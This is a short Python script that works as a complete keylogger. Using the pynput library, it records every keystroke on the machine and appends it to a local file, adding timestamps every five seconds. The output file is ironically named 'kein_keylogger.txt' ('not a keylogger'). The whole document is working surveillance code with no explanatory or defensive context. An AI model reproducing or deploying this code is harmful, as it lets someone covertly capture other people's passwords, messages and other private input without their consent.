from pynput import keyboard
import datetime
import time

start_zeit= round(time.time())
cooldown = 5
def on_press(key):
    
    global start_zeit
    global cooldown
    
    with open("kein_keylogger.txt","a") as logfile:
        if round(time.time()) >= start_zeit + cooldown:
            logfile.write("\n" + datetime.datetime.now().strftime("%d-%m-%Y %H:%M:%S:%f" + "\n"))
            start_zeit = round(time.time())
        try:
            logfile.write(str(key.char))
        except AttributeError:
            if key == keyboard.Key.space:
                logfile.write(" ")
            elif key == keyboard.Key.enter:
                logfile.write("\n")
            else:
                logfile.write(f" {key} ")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

